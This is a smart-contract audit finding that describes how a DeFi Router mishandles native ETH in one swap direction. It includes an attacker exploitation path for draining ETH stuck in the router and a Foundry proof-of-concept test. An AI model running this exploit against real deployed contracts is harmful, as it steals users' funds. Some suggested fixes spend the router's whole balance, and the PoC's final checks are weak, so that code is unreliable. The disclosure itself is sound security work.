## Title
Native Token Handling Asymmetry Allows ETH Loss and Theft in Router Contract

## Summary
The Router.sol contract's `handleLockData` function contains an asymmetry in how native ETH is handled between different swap directions. When `isToken1=true` and `isExactOut=true` with `token0=NATIVE_TOKEN_ADDRESS`, the `value` variable is incorrectly set to 0, causing the Router to use its own ETH balance instead of the pre-sent amount, leading to user fund loss and potential theft by attackers.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Router.sol` (contract Router, function handleLockData, lines 106-147) [1](#0-0) 

**Intended Logic:** The Router should handle all native token swaps consistently, either by sending ETH upfront to Core.swap and settling via `valueDifference` logic, or by ensuring the user's msg.value covers the required payment amount.

**Actual Logic:** The `value` variable is only set when `!params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS`, but there exists another scenario requiring ETH payment where this condition fails: when `isToken1=true` and `isExactOut=true` with `token0=NATIVE_TOKEN_ADDRESS`. In this case:
1. `value` is set to 0 (line 106-110)
2. Core.swap receives 0 ETH 
3. `increasing = true XOR true = false` (line 112)
4. The increasing=false branch executes (line 128-147)
5. `valueDifference = 0 - delta0` becomes negative when delta0 > 0 (line 135)
6. Router calls `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), delta0)` (line 141)
7. This uses the Router's own ETH balance, not the ETH from Core [2](#0-1) 

**Exploitation Path:**
1. **Victim Setup**: User calls `Router.swap{value: 10 ether}()` with parameters: `isToken1=true`, `isExactOut=true`, `poolKey.token0=NATIVE_TOKEN_ADDRESS`, intending to buy 1 ether worth of token1
2. **Partial Use**: The swap calculates `delta0 = 1 ether` (actual ETH needed), but `value=0`, so only 1 ETH is transferred via `SafeTransferLib.safeTransferETH`, leaving 9 ETH stuck in Router contract
3. **Attacker Exploitation**: Attacker calls `Router.swap{value: 0}()` with identical parameters requiring ETH payment
4. **Theft**: Router uses the stuck 9 ETH from its balance to pay for attacker's swap, giving attacker free tokens

**Security Property Broken:** Violates the Solvency invariant - user funds (9 ETH) are permanently lost and can be stolen by attackers.

## Impact Explanation
- **Affected Assets**: All native ETH sent by users when performing swaps with `isToken1=true`, `isExactOut=true`, and `token0=NATIVE_TOKEN_ADDRESS`
- **Damage Severity**: 
  - Users lose 100% of excess ETH sent beyond the calculated `delta0` amount
  - Attackers can drain accumulated ETH by performing identical swaps with `msg.value=0`
  - No upper limit on loss - could be any amount of ETH
- **User Impact**: Any user performing this specific swap type with excess ETH loses funds immediately. All users of this swap type are at risk.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this. No special permissions or capital required beyond gas fees.
- **Preconditions**: 
  - Router must have accumulated ETH balance from previous victims
  - Pool with native token0 must exist and be initialized
  - Attacker needs to identify the Router has ETH balance (trivial via etherscan/block explorer)
- **Execution Complexity**: Single transaction attack - call `Router.swap{value: 0}()` with correct parameters
- **Frequency**: Can be exploited continuously - every time Router accumulates ETH from victims, attacker can drain it

## Recommendation

The root cause is that the `value` calculation doesn't account for all scenarios where native token0 needs to be paid. The fix should ensure `value` is set correctly for all payment scenarios:

**Option 1 - Comprehensive value calculation:**
```solidity
// In src/Router.sol, handleLockData function, lines 106-110:

// CURRENT (vulnerable):
// Only sets value for one specific case
uint256 value = FixedPointMathLib.ternary(
    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
    uint128(params.amount()),
    0
);

// FIXED:
// Account for both cases where ETH needs to be sent upfront
bool needsEthUpfront = poolKey.token0 == NATIVE_TOKEN_ADDRESS && (
    (!params.isToken1() && !params.isExactOut()) ||  // Case 1: exact input of ETH
    (params.isToken1() && params.isExactOut())       // Case 2: exact output of token1, paying with ETH
);
uint256 value = needsEthUpfront ? address(this).balance : 0;  // Use full Router balance or msg.value tracking
```

**Option 2 - Revert on unsupported pattern:**
```solidity
// Add validation before the swap
if (poolKey.token0 == NATIVE_TOKEN_ADDRESS && params.isToken1() && params.isExactOut()) {
    revert UnsupportedNativeTokenSwapDirection();
}
```

**Option 3 - Consistent handling (recommended):**
Refactor to always send available msg.value to Core.swap and handle refunds uniformly:
```solidity
uint256 value = poolKey.token0 == NATIVE_TOKEN_ADDRESS ? address(this).balance : 0;
// Then handle refunds consistently in both branches
```

## Proof of Concept

```solidity
// File: test/Exploit_RouterETHTheft.t.sol
// Run with: forge test --match-test test_RouterETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/types/poolKey.sol";
import "../src/types/swapParameters.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";

contract Exploit_RouterETHTheft is Test {
    Core core;
    Router router;
    PoolKey poolKey;
    
    address victim = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        // Deploy contracts
        core = new Core();
        router = new Router(core);
        
        // Setup pool with NATIVE as token0
        poolKey = PoolKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: address(0x999), // mock ERC20
            config: PoolConfig.wrap(0)
        });
        
        // Initialize pool
        core.initializePool(poolKey, 0);
        
        // Fund victim and attacker
        vm.deal(victim, 20 ether);
        vm.deal(attacker, 1 ether);
    }
    
    function test_RouterETHTheft() public {
        // SETUP: Victim performs swap with excess ETH
        vm.startPrank(victim);
        
        SwapParameters params = createSwapParameters({
            _isToken1: true,           // Buying token1
            _amount: -1 ether,         // Exact output (negative)
            _sqrtRatioLimit: SqrtRatio.wrap(0),
            _skipAhead: 0
        });
        
        uint256 routerBalanceBefore = address(router).balance;
        
        // Victim sends 10 ETH but swap only needs ~1 ETH
        router.swap{value: 10 ether}(poolKey, params, type(int256).min);
        
        uint256 routerBalanceAfter = address(router).balance;
        uint256 stuckETH = routerBalanceAfter - routerBalanceBefore;
        
        vm.stopPrank();
        
        // VERIFY: ETH stuck in Router
        assertGt(stuckETH, 8 ether, "ETH should be stuck in Router");
        console.log("ETH stuck in Router:", stuckETH);
        
        // EXPLOIT: Attacker steals stuck ETH
        vm.startPrank(attacker);
        
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        // Attacker performs same swap with 0 value
        router.swap{value: 0}(poolKey, params, type(int256).min);
        
        uint256 attackerBalanceAfter = address(attacker).balance;
        
        vm.stopPrank();
        
        // VERIFY: Attacker got tokens without paying
        assertGt(routerBalanceAfter - address(router).balance, 0, "Router ETH was used");
        console.log("Attacker essentially paid:", attackerBalanceBefore - attackerBalanceAfter);
        console.log("Victim lost:", stuckETH);
    }
}
```

**Notes:**
- The vulnerability specifically affects the combination of `isToken1=true`, `isExactOut=true`, and `token0=NATIVE_TOKEN_ADDRESS`
- This violates the solvency invariant as user funds can be permanently lost
- The asymmetry between the `increasing=true` and `increasing=false` branches creates this exploitable condition
- The issue is in the core Router contract which is in scope and not related to any known issues
- Simple user error (sending too much ETH) becomes a theft vector due to the design flaw

### Citations

**File:** src/Router.sol (L106-147)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );

                bool increasing = params.isPriceIncreasing();

                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);

                int128 amountCalculated = params.isToken1() ? -balanceUpdate.delta0() : -balanceUpdate.delta1();
                if (amountCalculated < calculatedAmountThreshold) {
                    revert SlippageCheckFailed(calculatedAmountThreshold, amountCalculated);
                }

                if (increasing) {
                    if (balanceUpdate.delta0() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token0, recipient, uint128(-balanceUpdate.delta0()));
                    }
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.payFrom(swapper, poolKey.token1, uint128(balanceUpdate.delta1()));
                    }
                } else {
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token1, recipient, uint128(-balanceUpdate.delta1()));
                    }

                    if (balanceUpdate.delta0() != 0) {
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
                }
```
